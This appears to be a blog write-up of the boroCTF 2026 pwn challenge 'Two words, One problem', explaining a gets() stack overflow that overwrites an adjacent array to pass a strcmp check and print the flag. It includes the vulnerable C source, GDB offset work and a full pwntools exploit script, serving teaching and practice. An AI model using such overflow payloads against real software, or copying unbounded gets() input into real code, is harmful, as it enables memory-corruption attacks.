boroCTF 2026: [Pwn] Two words, One problem — Stack Buffer Overflow and Variable Overwrite

Oct 17, 2026 · M0x46 · 5 min read

Pwn Buffer Overflow boroCTF 2026
Summary: I solved Two words, One problem by exploiting a stack-based buffer overflow. The program used gets() on a 37-byte buffer. A 48-byte offset allowed me to overwrite an adjacent variable and pass the strcmp() check.

Challenge Overview

Two words, One problem was a Pwn challenge from boroCTF 2026, authored by Franklin.

The challenge description was:

The first time pwn solves problems.

We were given a compiled ELF binary and its C source code. The goal was to bypass a string comparison and make the program read flag.txt.

Recon and Analysis

I started by extracting the challenge files and inspecting the binary. 

unzip chal.zip
ls -la
file chal
checksec --file=chal
cat two.c

Inside main(), I found two local arrays:

#define BUFFSIZE 37
#define FLAGSIZE 64

char non_constant[BUFFSIZE] = "I love";
const char constant[BUFFSIZE] = "barackCTF";

The program provided two operations:

check(non_constant, constant);
change(non_constant);

The important function was check():

void check(char *nc, const char *c) {
    char flag[FLAGSIZE];

    printf("Checking...\n");

    if (strcmp(c, "boroCTF") == 0) {
        FILE *f = fopen("flag.txt", "r");
        fgets(flag, FLAGSIZE, f);
        printf("%s\n", flag);
    } else {
        printf("Nope!\n");
    }
}

To print the flag, the value of constant had to become "boroCTF". However, it was initially set to "barackCTF".

Root Cause

The vulnerability was inside change():

void change(char *nc) {
    printf("What would like to write?\n> ");
    gets(nc);
}

The gets() function does not check the destination buffer size. Since non_constant only holds 37 bytes, a longer input can overwrite adjacent stack memory.

Although constant was declared with the const keyword, that does not protect its stack memory from corruption caused by an out-of-bounds write.

Exploitation

1. Finding the Offset

I used GDB to inspect the stack layout:

gdb -q ./chal
set disassembly-flavor intel
disassemble main

The relevant offsets were:

non_constant -> rbp - 0x90
constant     -> rbp - 0x60

0x90 - 0x60 = 0x30 = 48 bytes

So I needed 48 bytes of padding to reach the beginning of constant.

2. Building the Payload

padding = b"A" * 48
target = b"boroCTF"
payload = padding + target

The payload fills the first buffer, crosses the padding between the arrays, and overwrites constant with "boroCTF". 

Before:
non_constant = "I love"
constant     = "barackCTF"

After:
non_constant = "AAAA..."
constant     = "boroCTF"

3. Triggering the Check

After sending the payload, I selected the check option. The strcmp() condition now returned zero, allowing the program to enter the flag-reading branch.

Full Exploit Script

I automated the exploitation using Pwntools.

#!/usr/bin/env python3
from pwn import *

HOST = "1xgu8bd1niap.boroctf.com"
PORT = 34069

context.log_level = "info"

OFFSET = 48
TARGET = b"boroCTF"

def build_payload():
    return b"A" * OFFSET + TARGET

def exploit(io):
    payload = build_payload()

    log.info(f"Offset: {OFFSET}")
    log.info(f"Payload: {payload!r}")

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", payload)
    io.sendlineafter(b"> ", b"1")

    io.interactive()

if __name__ == "__main__":
    if args.LOCAL:
        io = process("./chal")
    else:
        io = remote(HOST, PORT)

    exploit(io)

Run locally:

python3 solve.py LOCAL

Or against the original CTF service:

python3 solve.py

Result

The program printed the flag:

boroCTF{I_c@n_7ix_tH%s}

Takeaways

  • gets() is unsafe because it does not enforce buffer limits.
  • Buffer overflows can modify program data without overwriting a return address.
  • The const keyword does not prevent memory corruption.
  • GDB can help identify stack offsets.
  • Bounded input functions should replace gets().
